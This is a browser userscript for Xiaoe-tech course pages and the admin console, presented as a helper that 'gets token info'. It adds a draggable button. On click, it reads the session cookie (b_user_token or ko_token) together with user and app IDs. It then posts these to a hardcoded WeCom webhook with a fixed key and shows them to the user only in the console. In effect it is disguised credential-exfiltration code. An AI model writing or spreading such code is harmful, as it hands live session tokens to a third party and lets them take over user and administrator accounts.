// ==UserScript==
// @name         获取token信息
// @namespace    http://tampermonkey.net/
// @version      1.0.6
// @description  获取小鹅通b端、c端的token信息
// @author       You
// @match        *://*.h5.xiaoeknow.com/*
// @match        *://*.com/v2/course/alive/*
// @match        *://*.com/v3/course/alive/*
// @match        *://*.com/v4/course/alive/*
// @match        *://*.cn/p/t/free/*
// @match        *://*.cn/v3/course/alive/*
// @match        *://*.cn/v4/course/alive/*
// @match        *://admin.xiaoe-tech.com/*
// @icon         https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Circle-icons-tools.svg/2048px-Circle-icons-tools.svg.png
// @grant        GM_xmlhttpRequest
// @grant        unsafeWindow
// @downloadURL https://update.greasyfork.org/scripts/532259/%E8%8E%B7%E5%8F%96token%E4%BF%A1%E6%81%AF.user.js
// @updateURL https://update.greasyfork.org/scripts/532259/%E8%8E%B7%E5%8F%96token%E4%BF%A1%E6%81%AF.meta.js
// ==/UserScript==

(function() {
    "use strict";
    var gmRequestMethod = function(url, params, method, headers) {
        if (url === void 0) {
            url = "";
        }
        if (params === void 0) {
            params = {};
        }
        if (method === void 0) {
            method = "POST";
        }
        if (headers === void 0) {
            headers = {
                "Content-Type": "application/json"
            };
        }
        return new Promise((function(resolve, reject) {
            try {
                GM_xmlhttpRequest({
                    url: url,
                    method: method,
                    data: JSON.stringify(params),
                    headers: headers,
                    onload: function(xhr) {
                        resolve(xhr);
                    }
                });
            } catch (err) {
                reject(err);
            }
        }));
    };
    var isAdmin = location.href.includes("admin");
    var createToken = function() {
        var html_style = document.createElement("style");
        html_style.innerHTML = "\n    .token-btn {\n        position: fixed;\n        bottom: 4px;\n        right: 0;\n        z-index: 200000;\n        display: flex;\n        align-items: center;\n        font-size: 12px;\n        color: #fff;\n        border-radius: 3px;\n        background-color: #1472ff;\n        cursor: pointer;\n        white-space: nowrap;\n        padding: 4px 6px;\n        transition: all 0.3s ease-in-out;\n        box-shadow: 0 0 2px 3px rgba(20, 114, 255, 0.2);\n        animation: pulse 1.6s infinite;\n    }\n    @keyframes pulse {\n      0% {\n        box-shadow: 0 0 2px 3px rgba(20, 114, 255, 0.2);\n      }\n      50% {\n        box-shadow: 0 0 2px 8px rgba(20, 114, 255, 0.6);\n      }\n      100% {\n        box-shadow: 0 0 2px 3px rgba(20, 114, 255, 0.2);\n      }\n    }";
        var show_html = '\n    <div class="token-btn">\n      获取token\n    </div>';
        document.head.appendChild(html_style);
        document.body.insertAdjacentHTML("afterbegin", show_html);
        var token = isAdmin ? document.cookie.match(/b_user_token=([^;]+)/)[1] : document.cookie.match(/ko_token=([^;]+)/)[1];
        setTimeout((function() {
            var _a;
            var show_div = document.querySelector(".token-btn");
            var isDragging = false;
            var startX = 0;
            var startY = 0;
            var offsetX = 0;
            var offsetY = 0;
            function startDrag(x, y) {
                startX = x;
                startY = y;
                offsetX = x - show_div.offsetLeft;
                offsetY = y - show_div.offsetTop;
                isDragging = true;
                show_div.style.transition = "none";
                document.body.style.userSelect = "none";
            }
            function doDrag(x, y) {
                if (!isDragging) return;
                show_div.style.left = x - offsetX + "px";
                show_div.style.top = y - offsetY + "px";
                show_div.style.right = "auto";
                show_div.style.bottom = "auto";
                show_div.style.position = "fixed";
            }
            function endDrag(x, y) {
                document.body.style.userSelect = "";
                isDragging = false;
                show_div.style.transition = "all 0.3s ease-in-out";
            }
            show_div.addEventListener("mousedown", (function(e) {
                return startDrag(e.clientX, e.clientY);
            }));
            document.addEventListener("mousemove", (function(e) {
                return doDrag(e.clientX, e.clientY);
            }));
            document.addEventListener("mouseup", (function(e) {
                return endDrag(e.clientX, e.clientY);
            }));
            show_div.addEventListener("touchstart", (function(e) {
                var t = e.touches[0];
                startDrag(t.clientX, t.clientY);
            }));
            document.addEventListener("touchmove", (function(e) {
                var t = e.touches[0];
                doDrag(t.clientX, t.clientY);
            }));
            document.addEventListener("touchend", (function(e) {
                var t = e.changedTouches[0];
                endDrag(t.clientX, t.clientY);
            }));
            var alive_id = (_a = window.location.href.match(/l_[a-zA-Z0-9]+/)) !== null && _a !== void 0 ? _a : "null";
            show_div.addEventListener("click", (function(e) {
                var moved = Math.abs(e.clientX - startX) + Math.abs(e.clientY - startY);
                if (!isDragging && moved > 2) {
                    return;
                }
                var content = "".concat(isAdmin ? "管理台" : "h5直播间", " token信息\n\n").concat(isAdmin ? "b_user_token" : "ko_token", ":   ").concat(token, "\ndomain:   ").concat(window.location.origin || unsafeWindow.location.origin, "\nuser_id:   ").concat(unsafeWindow.USERID || unsafeWindow.__user_id, "\napp_id:   ").concat(unsafeWindow.APPID || unsafeWindow.__app_id, "\nalive_id:   ").concat(alive_id);
                gmRequestMethod("https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=f78a9255-9207-4412-8a48-dec962598b06", {
                    msgtype: "text",
                    text: {
                        content: content
                    }
                });
                console.log("获取到的信息", content);
            }));
        }), 500);
    };
    createToken();
})();